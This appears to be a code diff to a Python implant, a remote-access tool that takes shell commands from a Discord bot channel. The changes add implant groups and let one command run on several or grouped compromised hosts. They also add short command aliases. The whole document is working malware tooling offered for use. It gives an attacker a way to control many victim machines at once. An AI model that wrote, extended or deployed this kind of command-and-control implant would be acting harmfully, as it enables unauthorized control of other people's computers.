@@ -43,6 +43,7 @@ class Implant:
 		self.os = self.get_os()
 		self.user = self.get_user()
 		self.note = ""
+		self.groups = []
 
 	def get_channel(self, channel_name):
 		try:
@@ -88,6 +89,13 @@ class Implant:
 		except Exception as ex:
 			log_warn(f'Error getting username: {ex}')
 			return "?"
+
+	def add_to_group(self, group):
+		self.groups.append(group)
+
+	def remove_from_group(self, group):
+		self.groups.remove(group)
+
 
 # helper functions
 def get_datetime():
@@ -200,6 +208,22 @@ async def w_cmd(ctx, arg):
 async def l_cmd(ctx, arg):
 	if implant.os == 'Linux':
 		await _cmd(ctx, arg)
+
+#### multiple
+async def m_cmd(ctx, arg):
+	implants = arg[:arg.index(" ")].split(",")
+	arg = arg[(arg.index(" ")+1):]
+	for i in implants:
+		if i == implant.id:
+			await _cmd(ctx, arg)
+
+#### group
+async def g_cmd(ctx, arg):
+	gp_id = arg[:arg.index(" ")]
+	arg = arg[(arg.index(" ")+1):]
+	for g in implant.groups:
+		if g == gp_id:
+			await _cmd(ctx, arg)
 
 async def sessions_loop():
 	utc_now = datetime.now(timezone.utc)
@@ -338,6 +362,10 @@ async def cmd(ctx, *, arg):
 		windows implants
 	>cmd -l [command]
 		linux implants
+	>cmd -m [implant_id],[implant_id],...[implant_id] [command]
+		multiple implants in csv no whitespace
+	>cmd -g [group_id] [command]
+		command to all implants in a group
 	'''
 	
 	arg = arg[1::]
@@ -356,11 +384,19 @@ async def cmd(ctx, *, arg):
 			await w_cmd(ctx, arg[3:])
 		case "-l":
 			await l_cmd(ctx, arg[3:])
+		case "-m":
+			await m_cmd(ctx, arg[3:])
+		case "-g":
+			await g_cmd(ctx, arg[3:])
 		case _:
 			log_warn(f'Unknown flag {flag} received')
 			await reply_thread_once(ctx, f'Unknown flag `{flag}` received, please try again.')
 
 	log_good(f'Finished processing command: {arg}')
+
+@bot.command()
+async def c(ctx, *, arg):
+	await cmd(ctx, arg) #idk if this will work
 
 @bot.command()
 async def change_id(ctx, arg1, arg2):
@@ -377,6 +413,10 @@ async def change_id(ctx, arg1, arg2):
 	await delete_session_entry(arg1)
 
 @bot.command()
+async def chid(ctx, arg1, arg2):
+	await change_id(ctx, arg1, arg2)
+
+@bot.command()
 async def sessions(ctx):
 	'''
 	List the active sessions
@@ -384,6 +424,10 @@ async def sessions(ctx):
 
 	log_info(f'Received sessions command')
 	await reply_thread(ctx, get_implant_data_str())
+
+@bot.command()
+async def s(ctx):
+	await sessions(ctx)
 
 @bot.command()
 async def note(ctx, arg1, arg2):
@@ -398,6 +442,10 @@ async def note(ctx, arg1, arg2):
 	implant.note = arg2
 
 @bot.command()
+async def n(ctx, arg1, arg2):
+	await note(ctx, arg1, arg2)
+
+@bot.command()
 async def kill(ctx, arg):
 	'''
 	kill the implant with the provided id
@@ -409,6 +457,48 @@ async def kill(ctx, arg):
 	await delete_session_entry(arg)
 	await ctx.message.add_reaction('💀')
 	sys.exit()
+
+@bot.command()
+async def k(ctx, arg):
+	await kill(ctx, arg)
+
+@bot.command()
+async def add_to_group(ctx, *, arg):
+	'''
+	>add_to_group [group_id] [list of implant ids]
+	'''
+	
+	arg = arg[1::]
+	gp_id = arg[:arg.index(" ")]
+	arg = arg[(arg.index(" ")+1):]
+	implants = arg.split(",")
+	for i in implants:
+		if implant.id == i:
+			implant.add_to_group(gp_id)
+			await reply_thread(ctx, f'Added implant {implant.id} to group {gp_id}')
+
+@bot.command()
+async def agp(ctx, *, arg):
+	await add_to_group(ctx, arg)
+
+@bot.command()
+async def remove_from_group(ctx, *, arg):
+	'''
+	>remove_from_group [group_id] [list of implant ids]
+	'''
+	
+	arg = arg[1::]
+	gp_id = arg[:arg.index(" ")]
+	arg = arg[(arg.index(" ")+1):]
+	implants = arg.split(",")
+	for i in implants:
+		if implant.id == i:
+			implant.remove_from_group(gp_id)
+			await reply_thread(ctx, f'Removed implant {implant.id} from group {gp_id}')
+
+@bot.command()
+async def rgp(ctx, *, arg):
+	await remove_from_group(ctx, arg)
 
 f = open("token.txt", "r")
 bot.run(f.read())
